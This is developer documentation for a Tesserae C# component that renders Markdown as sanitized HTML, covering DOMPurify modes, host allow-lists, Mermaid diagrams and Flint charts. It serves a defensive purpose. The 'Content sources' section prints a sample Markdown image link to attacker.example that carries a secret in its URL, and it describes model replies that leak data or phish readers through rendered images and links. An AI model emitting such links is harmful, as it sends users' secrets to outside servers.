---
name: markdown-block
description: Renders Markdown source as sanitized HTML using the bundled marked + DOMPurify libraries. Use when displaying user-supplied or stored Markdown safely in a Tesserae (C#/Transpose) app.
---

# MarkdownBlock

Renders a Markdown string into sanitized HTML, so untrusted input is safe to
display. Setting `Text` re-renders.

## Create

`MarkdownBlock(string text = "", MarkdownSanitization sanitization = MarkdownSanitization.Default, MarkdownContentSources sources = null)`
— renders the given Markdown; `sources` says where it may load content from (see
[Content sources](#content-sources); `null` is `Any`). Bring the factory into scope with `using static Tesserae.UI;`.

## Key configuration

- `.Text` — get/set the Markdown source; assigning re-renders the sanitized HTML.
- `.HTML` — read the rendered, sanitized HTML.
- `.CanWrap` — whether the rendered text may wrap (false adds `tss-text-nowrap`).
- `.Sanitization(MarkdownSanitization)` — change how strictly the HTML is sanitized
  and re-render the current source with it.
- `.ContentSources(MarkdownContentSources)` — where the Markdown may load content
  from (images, a diagram's pictures, a chart's data); re-renders, and every later
  render keeps it. See [Content sources](#content-sources).
- `.OnAfterRender(Action<HTMLElement>)` — called with the inner element every time
  the source is re-parsed, for post-processing the rendered tree (wrapping code
  blocks, attaching copy buttons, …).
- `.TableCopyButtons(bool show = true)` — on by default: every rendered table is
  wrapped in a `div.tss-markdown-table` with two buttons beside it, **Copy Table**
  (puts it on the clipboard as HTML plus tab-separated text, so it pastes as a table
  into a document, spreadsheet or email) and **Copy as CSV**. Pass `false` to render
  bare tables. The buttons are added after sanitization, so they appear under either
  `MarkdownSanitization` mode.

The rich copy is also available on its own as `Clipboard.CopyHtml(html, plainText)`
(call it from a click handler — browsers only allow a copy inside a user gesture).

## Sanitization

Both modes run the parsed HTML through DOMPurify; the mode picks its configuration.

- `MarkdownSanitization.Default` — DOMPurify's default profile: scripts and event
  handlers go, links and images stay.
- `MarkdownSanitization.NoLinksOrEmbeddedContent` — also removes every link and
  every piece of embedded content (anchors, images, SVG, media) and the attributes
  that fetch a remote URL. A link keeps its label as plain text and is not
  clickable; an image is dropped entirely. Use it for Markdown from a source you
  don't trust to link or to load a remote URL — an LLM reply, for instance, where a
  rendered image is a call out to a third-party server and a rendered link is a way
  to phish the reader.

```csharp
// An assistant reply: rendered, but with nothing clickable and nothing fetched.
var reply = MarkdownBlock(assistantText, MarkdownSanitization.NoLinksOrEmbeddedContent);
```

The same option exists on the static helpers behind the component:
`Markdown.ConvertMarkdownSanitized(text, sanitization)` returns the sanitized HTML
string and `Markdown.RenderMarkdownSanitized(text, sanitization)` returns a rendered
element (`Markdown.RenderMarkdownSanitized(text, sanitization, flintTheme)` also draws
Flint charts).

## Content sources

`MarkdownSanitization.Default` lets the browser fetch any URL the Markdown names, with
no click: `![](https://attacker.example/x.png?d=<secret>)` in a model's reply sends the
secret away. `MarkdownContentSources` is the middle ground between that and
`NoLinksOrEmbeddedContent`: links stay clickable, and content loads only from where you
say. It is independent of the sanitization mode, and the two compose.

- `MarkdownContentSources.Any` — the default: nothing is filtered or looked at.
- `MarkdownContentSources.SameOrigin` — the page's own origin: relative URLs, and
  `data:` / `blob:` URLs.
- `MarkdownContentSources.SameOriginAnd(params string[] hosts)` (or an
  `IEnumerable<string>`) — plus `http`/`https` URLs on the listed hosts. An entry is a
  host name, case-insensitive; `*.example.com` also matches every subdomain and
  `example.com` itself. An entry with a scheme, a port or a path never matches.
- `.Allows(string url)` — the same rule for a URL your own code is about to render
  (a thumbnail a tool or a model supplied). `.IsRestricted`, `.Hosts`, `.Key`; two
  policies with the same hosts are `Equals`.

What a restricting policy does:

- **Prose** — `src`, every candidate of a `srcset`, `poster`, `background`, `data`, an
  `href` on `<link>` and on SVG elements other than `<a>`, a `style` attribute or
  `<style>` element that fetches, an SVG presentation attribute with a `url(...)` that
  is not `url(#id)`: the attribute goes when its URL is not allowed, the element and
  the text around it stay. `<a href>` is never touched.
- **Mermaid diagrams** — a picture from elsewhere is left out, on the first draw and on
  every relayout.
- **Flint charts** — a chart that would load from elsewhere is not drawn and stays its
  code block, with the reason as its tooltip: a `url` anywhere in the spec (`data.url`,
  a map's `chartProperties.levels[].url`), a `Map` / `Choropleth` unless
  `vega.github.io` and `cdn.jsdelivr.net` are listed (Flint's built-in outlines), and
  the tooltip's picture — a data column named `image` holding a URL that is not
  allowed, or an encoding `title` of `image`.

```csharp
// An assistant reply: links work, pictures only from this app and its image CDN.
var sources = MarkdownContentSources.SameOriginAnd("images.example.com", "*.cdn.example.com");
var reply   = MarkdownBlock(assistantText, sources: sources).Flint();

reply.Text = nextChunk;                       // still filtered
if (sources.Allows(thumbnailUrl)) { /* render your own <img> */ }
```

The static helpers take the policy right after the text:
`Markdown.ConvertMarkdownSanitized(text, sources, sanitization = Default)`,
`Markdown.RenderMarkdownSanitized(text, sources, sanitization = Default)` and
`Markdown.RenderMarkdownSanitized(text, sources, sanitization, flintTheme, overrideFenceTheme = false)`.
Pass the policy to the constructor (or set it before the text) for Markdown that must
never load from elsewhere: the block renders as soon as it has text.

## Mermaid diagrams

A fenced code block tagged `mermaid` is drawn as a diagram by [Pele](https://pele.run),
which renders Mermaid syntax (every diagram type of Mermaid 12.1) to SVG. It is not the
Mermaid library. Nothing to call: it happens in `MarkdownBlock` and in
`Markdown.RenderMarkdownSanitized`.

````csharp
MarkdownBlock(@"```mermaid
flowchart LR
  A[Markdown] --> B[Diagram]
```");
````

- **Loaded on demand.** Pele ships as its own file (`assets/js/tss-pele.min.js`, not
  linked from `index.html`) and is fetched the first time a source contains a diagram.
  Until then, and for good when a diagram cannot be drawn (a block still being streamed,
  a syntax error), the fence stays a plain code block; the reason is its tooltip.
- **Themed.** Colors, fonts, radius and series colors come from Tesserae's tokens
  (`tss.mermaid.css` sets the `--pele-*` variables on `.tss-mermaid`), so a diagram
  follows light/dark mode and custom themes without being redrawn (the Curiosity, Stratus,
  RetroOS and Rechenwerk packages each add a few rules so a diagram is framed like their code blocks). Override a
  `--pele-*` variable on `.tss-mermaid` to restyle.
- **Safe.** The SVG goes through DOMPurify; `MarkdownSanitization.NoLinksOrEmbeddedContent`
  also turns off links and images inside diagrams, and a `MarkdownContentSources` policy
  keeps a diagram's pictures to the sources it allows.
- `Markdown.ConvertMarkdownSanitized` returns a string, so it leaves the fence as a
  `language-mermaid` code block.

## Flint charts

Off by default. `.Flint()` draws a `flint` fence as a chart with Microsoft's
[Flint](https://github.com/microsoft/flint-chart) (rendered by Vega-Lite, loaded on
demand), in `FlintThemes.Tesserae`; `.Flint(IFlintTheme theme, bool overrideFenceTheme = false)`
picks the theme. The fence body is a Flint chart spec in JSON. See `flint-charts.md`.

````csharp
MarkdownBlock(@"```flint
{ ""data"": { ""values"": [ { ""K"": ""a"", ""V"": 3 }, { ""K"": ""b"", ""V"": 5 } ] },
  ""semantic_types"": { ""K"": ""Category"", ""V"": ""Count"" },
  ""chart_spec"": { ""chartType"": ""Bar Chart"", ""encodings"": { ""x"": { ""field"": ""K"" }, ""y"": { ""field"": ""V"" } } } }
```").Flint();
````

## Example

```csharp
using static Tesserae.UI;

var md = MarkdownBlock(@"# Hello

This is **Markdown** rendered inside a Tesserae component.

- It supports lists
- And `inline code`
- And [links](https://curiosity.ai)
");

// Update later:
md.Text = "Updated **content**.";
```

## Related

- CodeDiff — a unified diff rather than prose — `code-diff.md`
- Mermaid — the same diagram renderer as a standalone component — `mermaid.md`
- Flint charts — `flint` fences, `IFlintTheme` and `FlintThemes` — `flint-charts.md`
- TextBlock — `/tesserae/text/text-block`
- AnnotatedTextEditor — `/tesserae/inputs/annotated-text-editor`
- Full docs & API: `/tesserae/text/markdown-block`
